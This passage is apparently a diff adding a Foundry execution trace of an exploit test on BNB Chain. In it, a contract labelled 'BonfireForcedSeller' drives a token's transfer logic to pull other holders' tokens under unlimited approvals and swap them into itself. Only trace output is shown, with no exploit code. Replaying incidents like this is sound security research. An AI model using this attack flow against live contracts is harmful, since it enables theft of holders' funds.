+    │   │   │   │   │   @ 0x0e70f7349d87c30a3bb207941a643cb71811eac6aa218ed7bbfaa27889f37af8: 0x4af2c83d0fef9928a0459af1fad0295f78ac4d100e17d94880efb5fbafb2e73c → 0x4a7f4c2cc5a771501456dfde31b079b2654d51c351adac73d84f680d1dd176f2
+    │   │   │   │   │   @ 0xd506f4495fb33e52df08a8807e5e6a6ddb260b96689d8a7265416641576e1ef3: 0x000ce9d3d1606fccd9cbc0856bfcaa22462c471ae7adfbcc0b27df8a690845b9 → 0x0012b007d5173e97ad974d481a1ff188906e311fc7ec8c827b2100e102fdde85
+    │   │   │   │   │   @ 10: 0xb5f7b42ef1daf2595f94b6e7b755e9fa49564a1476b045676357873d955c3307 → 0xb5f1edfaee24238e8bc92a250932a293ff14600f9671b4b0f35e65e6fb669a3b
+    │   │   │   │   │   @ 11: 0x00000000000000000000000000000000000000000000484817146a25354e947e → 0x00000000000000000000000000000000000000000000484ecf4915f4e2e10a2c
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [2222] 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590::balanceOf(0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2) [staticcall]
+    │   │   │   │   └─ ← [Return] 409449233098058424918824 [4.094e23]
+    │   │   │   ├─ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2) [staticcall]
+    │   │   │   │   └─ ← [Return] 5865040887934810179567 [5.865e21]
+    │   │   │   ├─ emit Sync(reserve0: 409449233098058424918824 [4.094e23], reserve1: 5865040887934810179567 [5.865e21])
+    │   │   │   ├─ emit Swap(sender: 0x17e801E17CeFC6334059189c178D4783830E03D3, amount0In: 2484965062678055235751 [2.484e21], amount1In: 0, amount0Out: 2479077747049672815009 [2.479e21], amount1Out: 0, to: BonfireForcedSeller: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 8: 0x6aa8ba3200000000013df1cafd421ff9c7ef0000000056b3f7df414d17ed2422 → 0x6aa90cb400000000013df1cafd421ff9c7ef0000000056b4499333ac3e442328
+    │   │   │   │   @ 10: 0x00000000000000000000000000022a1685d171f7f4d1ff9e75e127bf04d06150 → 0x00000000000000000000000000022a2d05c1b360d8c49d44a0f5b92d0dfc6b4a
+    │   │   │   │   @ 9: 0x0000000000000000000000000000005a9a70cc38303b6cd5b781ca3d15b08e58 → 0x0000000000000000000000000000005a9b9f5bb6c04c96928a53b6c38388655e
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [426] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::token0() [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000005e90253fbae4dab78aa351f4e6fed08a64ab5590
+    │   │   ├─ [2222] 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590::balanceOf(BonfireForcedSeller: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   └─ ← [Return] 2231446568821330298818 [2.231e21]
+    │   │   ├─ [426] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::token0() [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000005e90253fbae4dab78aa351f4e6fed08a64ab5590
+    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000086641d6c398f7131a1
+    │   ├─ [2222] 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590::balanceOf(0xefF2FC4E3145f58F534d68A36Bcd3085Be6a4096) [staticcall]
+    │   │   └─ ← [Return] 3232598686012148737884 [3.232e21]
+    │   ├─ [81090] 0x17e801E17CeFC6334059189c178D4783830E03D3::transfer(0xefF2FC4E3145f58F534d68A36Bcd3085Be6a4096, 2644928766184339197335 [2.644e21], BonfireForcedSeller: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1789463732 [1.789e9])
+    │   │   ├─ [16635] 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590::transferFrom(0xefF2FC4E3145f58F534d68A36Bcd3085Be6a4096, 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2, 2644928766184339197335 [2.644e21])
+    │   │   │   ├─ emit Transfer(from: 0xefF2FC4E3145f58F534d68A36Bcd3085Be6a4096, to: 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2, amount: 2380435889565905277603 [2.38e21])
+    │   │   │   ├─ emit Approval(owner: 0xefF2FC4E3145f58F534d68A36Bcd3085Be6a4096, spender: 0x17e801E17CeFC6334059189c178D4783830E03D3, amount: 115792089237316195423570985008687907853269984665640564033668479240784647790847 [1.157e77])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xd40fc42a02c2fa7d1e9e34cbe6b01b7689000a13e1f34c5ea3b713c2e3544d31: 0x00969158546a029128084d345be747f10f8900882e23d2d4fe94a59497d890e2 → 0x001b5f58c33986e460639068ae8a132006b0cc6cb92ea62280b8d516752a80eb
+    │   │   │   │   @ 10: 0xb5f1edfaee24238e8bc92a250932a293ff14600f9671b4b0f35e65e6fb669a3b → 0xb5ebc5148d481d5f81ce5f45ff94ec25ce63dbd75936c3441f18c85113889881
+    │   │   │   │   @ 0xf4f92df4bb053eb88795bc6e59760a494e4e4e072ee211af9797c80531b80bdb: 0xffffffffffffffffffffffffffffffffffffffffffffff558dcae9b3201e6e96 → 0xfffffffffffffffffffffffffffffffffffffffffffffec62c084e49ca5fa0ff
+    │   │   │   │   @ 0x0e70f7349d87c30a3bb207941a643cb71811eac6aa218ed7bbfaa27889f37af8: 0x4a7f4c2cc5a771501456dfde31b079b2654d51c351adac73d84f680d1dd176f2 → 0x4aee2c5f951fe09ec80606ebcbd241a70cc47d6e4c2cf64cad9ffd5f70c38375
+    │   │   │   │   @ 11: 0x00000000000000000000000000000000000000000000484ecf4915f4e2e10a2c → 0x000000000000000000000000000000000000000000004855fa92d0ed5a5dc7a6
+    │   │   │   │   @ 0xd506f4495fb33e52df08a8807e5e6a6ddb260b96689d8a7265416641576e1ef3: 0x0012b007d5173e97ad974d481a1ff188906e311fc7ec8c827b2100e102fdde85 → 0x0018d8ee35f344c6b792182723bda7f6c11eb55805277def4f669e76eadbe03f
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [426] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::token0() [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000005e90253fbae4dab78aa351f4e6fed08a64ab5590
+    │   │   ├─ [494] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::getReserves() [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000056b4499333ac3e44232800000000000000000000000000000000000000000000013df1cafd421ff9c7ef000000000000000000000000000000000000000000000000000000006aa90cb4
+    │   │   ├─ [2222] 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590::balanceOf(0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2) [staticcall]
+    │   │   │   └─ ← [Return] 411884139198029327312924 [4.118e23]
+    │   │   ├─ [426] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::token0() [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000005e90253fbae4dab78aa351f4e6fed08a64ab5590
+    │   │   ├─ [426] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::token0() [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000005e90253fbae4dab78aa351f4e6fed08a64ab5590
+    │   │   ├─ [2222] 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590::balanceOf(0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2) [staticcall]
+    │   │   │   └─ ← [Return] 411884139198029327312924 [4.118e23]
+    │   │   ├─ [557] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::token1() [staticcall]
+    │   │   │   └─ ← [Return] 0x000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c
+    │   │   ├─ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2) [staticcall]
+    │   │   │   └─ ← [Return] 5865040887934810179567 [5.865e21]
+    │   │   ├─ [494] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::getReserves() [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000056b4499333ac3e44232800000000000000000000000000000000000000000000013df1cafd421ff9c7ef000000000000000000000000000000000000000000000000000000006aa90cb4
+    │   │   ├─ [426] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::token0() [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000005e90253fbae4dab78aa351f4e6fed08a64ab5590
+    │   │   ├─ [366] 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590::totalSupply() [staticcall]
+    │   │   │   └─ ← [Return] 1000000000000000000000000 [1e24]
+    │   │   ├─ [2703] 0xf33D46ecBB9fEdF80F8fEeBa8eb9d3c1053d3f91::computeSwapAmountsWithReflection(5865040887934810179567 [5.865e21], 411884139198029327312924 [4.118e23], 5865040887934810179567 [5.865e21], 409449233098058424918824 [4.094e23], 5, 1000000000000000000000000 [1e24], 2) [staticcall]
+    │   │   │   ├─ [1848] 0x122f7B4504DdFf2151636811fC9E6DB066f6d437::computeSwapAmountsWithReflection(5865040887934810179567 [5.865e21], 411884139198029327312924 [4.118e23], 5865040887934810179567 [5.865e21], 409449233098058424918824 [4.094e23], 5, 1000000000000000000000000 [1e24], 2) [delegatecall]
+    │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000866dee7d58e20bded7
+    │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000866dee7d58e20bded7
+    │   │   ├─ [426] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::token0() [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000005e90253fbae4dab78aa351f4e6fed08a64ab5590
+    │   │   ├─ [426] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::token0() [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000005e90253fbae4dab78aa351f4e6fed08a64ab5590
+    │   │   ├─ [2222] 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590::balanceOf(BonfireForcedSeller: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   └─ ← [Return] 2231741708713533789611 [2.231e21]
+    │   │   ├─ [31264] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::swap(2479785112492374220503 [2.479e21], 0, BonfireForcedSeller: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x)
+    │   │   │   ├─ [16110] 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590::transfer(BonfireForcedSeller: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 2479785112492374220503 [2.479e21])
+    │   │   │   │   ├─ emit Transfer(from: 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2, to: BonfireForcedSeller: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], amount: 2231806601243136798453 [2.231e21])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60: 0x0067efa842da8a42e457a18e6cd920e07edb2742fbed0b67c8ae0b415df63eb2 → 0x00cfe01695233e32c1a2a3fb92f35b2d7dae7eb7f5acd9773125151046db9c39
+    │   │   │   │   │   @ 0xd506f4495fb33e52df08a8807e5e6a6ddb260b96689d8a7265416641576e1ef3: 0x0018d8ee35f344c6b792182723bda7f6c11eb55805277def4f669e76eadbe03f → 0x001e9f2d3a8587a9604f01dae6a378f37fd98be733a96807e371a8f29e13ec9a
+    │   │   │   │   │   @ 10: 0xb5ebc5148d481d5f81ce5f45ff94ec25ce63dbd75936c3441f18c85113889881 → 0xb5e5fed588b5da7cd91175923caf1b290fa905482ab4d92b8b0dbdd560508c26
+    │   │   │   │   │   @ 11: 0x000000000000000000000000000000000000000000004855fa92d0ed5a5dc7a6 → 0x00000000000000000000000000000000000000000000485cb34523fe98de5f97
+    │   │   │   │   │   @ 0x0e70f7349d87c30a3bb207941a643cb71811eac6aa218ed7bbfaa27889f37af8: 0x4aee2c5f951fe09ec80606ebcbd241a70cc47d6e4c2cf64cad9ffd5f70c38375 → 0x4a7aaf7339b2a6e9994131171fec6560907b78daf569540c1d12de99216e0d38
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [2222] 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590::balanceOf(0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2) [staticcall]
+    │   │   │   │   └─ ← [Return] 409455122121340465446935 [4.094e23]
+    │   │   │   ├─ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2) [staticcall]
+    │   │   │   │   └─ ← [Return] 5865040887934810179567 [5.865e21]
+    │   │   │   ├─ emit Sync(reserve0: 409455122121340465446935 [4.094e23], reserve1: 5865040887934810179567 [5.865e21])
+    │   │   │   ├─ emit Swap(sender: 0x17e801E17CeFC6334059189c178D4783830E03D3, amount0In: 2485674135774414748614 [2.485e21], amount1In: 0, amount0Out: 2479785112492374220503 [2.479e21], amount1Out: 0, to: BonfireForcedSeller: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 8: 0x6aa90cb400000000013df1cafd421ff9c7ef0000000056b4499333ac3e442328 → 0x6aa90cb400000000013df1cafd421ff9c7ef0000000056b49b4d37257e4c0017
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [426] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::token0() [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000005e90253fbae4dab78aa351f4e6fed08a64ab5590
+    │   │   ├─ [2222] 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590::balanceOf(BonfireForcedSeller: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   └─ ← [Return] 4464101810617201527490 [4.464e21]
+    │   │   ├─ [426] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::token0() [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000005e90253fbae4dab78aa351f4e6fed08a64ab5590
+    │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000866dee7d58e20bded7
+    │   ├─ [6222] 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590::balanceOf(0xB5FA67EaA51b82dcf807021714af6E9469a8C60a) [staticcall]
+    │   │   └─ ← [Return] 39768336721428680753 [3.976e19]
+    │   ├─ [341759] 0x17e801E17CeFC6334059189c178D4783830E03D3::transfer(0xB5FA67EaA51b82dcf807021714af6E9469a8C60a, 35793541251552693748 [3.579e19], BonfireForcedSeller: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1789463732 [1.789e9])
+    │   │   ├─ [279468] 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590::transferFrom(0xB5FA67EaA51b82dcf807021714af6E9469a8C60a, 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2, 35793541251552693748 [3.579e19])
+    │   │   │   ├─ [287] 0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F::WETH() [staticcall]
+    │   │   │   │   └─ ← [Return] 0x000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c
+    │   │   │   ├─ emit Approval(owner: 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590, spender: 0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F, amount: 250000000000000000000 [2.5e20])
+    │   │   │   ├─ [99725] 0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F::swapExactTokensForETHSupportingFeeOnTransferTokens(250000000000000000000 [2.5e20], 0, [0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590, 1789463732 [1.789e9])
+    │   │   │   │   ├─ [29453] 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590::transferFrom(0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590, 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2, 250000000000000000000 [2.5e20])
+    │   │   │   │   │   ├─ emit Transfer(from: 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590, to: 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2, amount: 250000000000000000000 [2.5e20])
+    │   │   │   │   │   ├─ emit Approval(owner: 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590, spender: 0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F, amount: 0)
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x0e70f7349d87c30a3bb207941a643cb71811eac6aa218ed7bbfaa27889f37af8: 0x4a7aaf7339b2a6e9994131171fec6560907b78daf569540c1d12de99216e0d38 → 0x4a8653ac7ea8f82ee0bba0ccbab0cab22cb5d17f22fd7828759c398f03760d38
+    │   │   │   │   │   │   @ 0xea314ef73431ede908c8da6476f47dc1b0413058ab60cf1a92b32e0b1395e161: 0x00000000000000000000000000000000000000000000000d8d726b7177a80000 → 0
+    │   │   │   │   │   │   @ 0xd506f4495fb33e52df08a8807e5e6a6ddb260b96689d8a7265416641576e1ef3: 0x001e9f2d3a8587a9604f01dae6a378f37fd98be733a96807e371a8f29e13ec9a → 0x0012faf3f58f366418d492254bdf13a1e39f3343061543eb8ae84dfcbc0bec9a
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [494] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000056b49b4d37257e4c001700000000000000000000000000000000000000000000013df1cafd421ff9c7ef000000000000000000000000000000000000000000000000000000006aa90cb4
+    │   │   │   │   ├─ [2222] 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590::balanceOf(0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 409705122121340465446935 [4.097e23]
+    │   │   │   │   ├─ [43127] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::swap(0, 3571665103417719397 [3.571e18], 0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F, 0x)
+    │   │   │   │   │   ├─ [27962] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::transfer(0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F, 3571665103417719397 [3.571e18])
+    │   │   │   │   │   │   ├─ emit Transfer(from: 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2, to: 0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F, amount: 3571665103417719397 [3.571e18])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0x0e70f7349d87c30a3bb207941a643cb71811eac6aa218ed7bbfaa27889f37af8: 0x00000000000000000000000000000000000000000000013df1cafd421ff9c7ef → 0x00000000000000000000000000000000000000000000013dc039e2c52e1a8d8a
+    │   │   │   │   │   │   │   @ 0x9ee2e5eb3767e03c8aed4d13c1e177ca4d29e8984efbe568488f465a14085941: 0 → 0x00000000000000000000000000000000000000000000000031911a7cf1df3a65
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [2222] 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590::balanceOf(0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 409705122121340465446935 [4.097e23]
+    │   │   │   │   │   ├─ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 5861469222831392460170 [5.861e21]
+    │   │   │   │   │   ├─ emit Sync(reserve0: 409705122121340465446935 [4.097e23], reserve1: 5861469222831392460170 [5.861e21])
+    │   │   │   │   │   ├─ emit Swap(sender: 0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F, amount0In: 250000000000000000000 [2.5e20], amount1In: 0, amount0Out: 0, amount1Out: 3571665103417719397 [3.571e18], to: 0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F)
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 8: 0x6aa90cb400000000013df1cafd421ff9c7ef0000000056b49b4d37257e4c0017 → 0x6aa90cb400000000013dc039e2c52e1a8d8a0000000056c228bfa296f5f40017
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 3571665103417719397 [3.571e18]
+    │   │   │   │   ├─ [9235] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::withdraw(3571665103417719397 [3.571e18])
+    │   │   │   │   │   ├─ [95] 0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F::fallback{value: 3571665103417719397}()
+    │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   ├─ emit Withdrawal(src: 0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F, wad: 3571665103417719397 [3.571e18])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x9ee2e5eb3767e03c8aed4d13c1e177ca4d29e8984efbe568488f465a14085941: 0x00000000000000000000000000000000000000000000000031911a7cf1df3a65 → 0
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ [55] 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590::fallback{value: 3571665103417719397}()
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ emit Approval(owner: 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590, spender: 0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F, amount: 250000000000000000000 [2.5e20])
+    │   │   │   ├─ [128683] 0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F::addLiquidityETH{value: 3571665103417719397}(0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590, 250000000000000000000 [2.5e20], 0, 0, 0x0000000000000000000000000000000000000000, 1789463732 [1.789e9])
+    │   │   │   │   ├─ [2688] 0xBCfCcbde45cE874adCB698cC183deBcF17952812::getPair(0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000d3f478f0d5e98b01f757bc6cb54db4c00b9838f2
+    │   │   │   │   ├─ [494] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000056c228bfa296f5f4001700000000000000000000000000000000000000000000013dc039e2c52e1a8d8a000000000000000000000000000000000000000000000000000000006aa90cb4
+    │   │   │   │   ├─ [23139] 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590::transferFrom(0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590, 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2, 249652336597175393010 [2.496e20])
+    │   │   │   │   │   ├─ emit Transfer(from: 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590, to: 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2, amount: 249652336597175393010 [2.496e20])
+    │   │   │   │   │   ├─ emit Approval(owner: 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590, spender: 0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F, amount: 347663402824606990 [3.476e17])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0xea314ef73431ede908c8da6476f47dc1b0413058ab60cf1a92b32e0b1395e161: 0x00000000000000000000000000000000000000000000000d8d726b7177a80000 → 0x00000000000000000000000000000000000000000000000004d32605dac3a50e
+    │   │   │   │   │   │   @ 0x0e70f7349d87c30a3bb207941a643cb71811eac6aa218ed7bbfaa27889f37af8: 0x4a8653ac7ea8f82ee0bba0ccbab0cab22cb5d17f22fd7828759c398f03760d38 → 0x4a91f3c0c85dbe5a635f69b838d8f9fd22161d6a01ef1ec38bdb284de0bb33a2
+    │   │   │   │   │   │   @ 0xd506f4495fb33e52df08a8807e5e6a6ddb260b96689d8a7265416641576e1ef3: 0x0012faf3f58f366418d492254bdf13a1e39f3343061543eb8ae84dfcbc0bec9a → 0x00075adfabda70389630c939cdb6e456ee3ee75827239d5074a95f3ddec6c630
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [21974] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::deposit{value: 3571665103417719397}()
+    │   │   │   │   │   ├─ emit Deposit(dst: 0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F, wad: 3571665103417719397 [3.571e18])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x9ee2e5eb3767e03c8aed4d13c1e177ca4d29e8984efbe568488f465a14085941: 0 → 0x00000000000000000000000000000000000000000000000031911a7cf1df3a65
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ [3262] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::transfer(0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2, 3571665103417719397 [3.571e18])
+    │   │   │   │   │   ├─ emit Transfer(from: 0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F, to: 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2, amount: 3571665103417719397 [3.571e18])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x0e70f7349d87c30a3bb207941a643cb71811eac6aa218ed7bbfaa27889f37af8: 0x00000000000000000000000000000000000000000000013dc039e2c52e1a8d8a → 0x00000000000000000000000000000000000000000000013df1cafd421ff9c7ef
+    │   │   │   │   │   │   @ 0x9ee2e5eb3767e03c8aed4d13c1e177ca4d29e8984efbe568488f465a14085941: 0x00000000000000000000000000000000000000000000000031911a7cf1df3a65 → 0
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [60804] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::mint(0x0000000000000000000000000000000000000000)
+    │   │   │   │   │   ├─ [2222] 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590::balanceOf(0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 409954774457937640839945 [4.099e23]
+    │   │   │   │   │   ├─ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 5865040887934810179567 [5.865e21]
+    │   │   │   │   │   ├─ [2315] 0xBCfCcbde45cE874adCB698cC183deBcF17952812::feeTo() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000009e2c4933d6228a69149e3011cb1302f3e46a4263
+    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x9e2C4933D6228a69149E3011CB1302f3e46a4263, amount: 202017798082394469 [2.02e17])
+    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x0000000000000000000000000000000000000000, amount: 26078723296429682296 [2.607e19])
+    │   │   │   │   │   ├─ emit Sync(reserve0: 409954774457937640839945 [4.099e23], reserve1: 5865040887934810179567 [5.865e21])
+    │   │   │   │   │   ├─ emit Mint(minter: 0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F, mintAmount: 249652336597175393010 [2.496e20], mintTokens: 3571665103417719397 [3.571e18])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0xd937ec5e90d3efa9c8f7e8ab6a885e00b2ca00c4a87c33133f4bfc24e0919ad6: 0x0000000000000000000000000000000000000000000000200cf4b044607ac79b → 0x0000000000000000000000000000000000000000000000200fc26662557cc100
+    │   │   │   │   │   │   @ 11: 0x000000000000000000000000006bae8732c821396af901065bc9d91e2fc46efa → 0x000000000000000000000000006bd12cfe43472bb43b24895416ff55e981fc67
+    │   │   │   │   │   │   @ 0: 0x00000000000000000000000000000000000000000000091010dbc93141301b01 → 0x0000000000000000000000000000000000000000000009117d93bbf9fd9742de
+    │   │   │   │   │   │   @ 0xa6eef7e35abe7026729641147f7915573c7e97b47efa546f5f6e3230263bcb49: 0x000000000000000000000000000000000000000000000855f00776c2abc7e593 → 0x00000000000000000000000000000000000000000000085759f1b36d732d140b
+    │   │   │   │   │   │   @ 8: 0x6aa90cb400000000013dc039e2c52e1a8d8a0000000056c228bfa296f5f40017 → 0x6aa90cb400000000013df1cafd421ff9c7ef0000000056cfb15ee80292d85b09
